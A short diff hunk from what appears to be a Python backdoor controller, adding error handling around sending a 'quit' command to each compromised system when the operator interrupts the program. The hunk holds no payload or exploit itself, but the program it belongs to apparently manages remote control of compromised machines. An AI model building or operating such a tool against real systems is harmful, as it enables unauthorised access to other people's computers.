@@ -310,8 +310,14 @@ if __name__ == "__main__":
         except KeyboardInterrupt: 
             if(BackdoorAttack.compromised_sys_count > 0):
                 print("\n\nClosing all connections...")
+
                 for obj in obj_list:
-                    obj.execute_on_sys(["quit"])
+                    try:
+                        obj.execute_on_sys(["quit"])
+
+                    except:
+                        continue
+
                 print("Stopping Backdoor Attack...\n")
 
             else:
